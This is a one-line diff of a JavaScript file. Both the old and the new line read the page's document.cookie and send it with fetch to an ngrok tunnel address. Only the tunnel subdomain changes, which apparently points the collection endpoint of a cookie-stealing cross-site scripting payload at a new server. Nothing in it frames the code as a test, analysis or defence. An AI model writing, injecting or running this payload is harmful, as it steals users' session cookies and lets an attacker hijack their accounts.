@@ -1,1 +1,1 @@
-fetch("http://344e-140-213-150-205.ngrok.io/?c="+document.cookie);
+fetch("http://b248-140-213-150-205.ngrok.io/?c="+document.cookie);
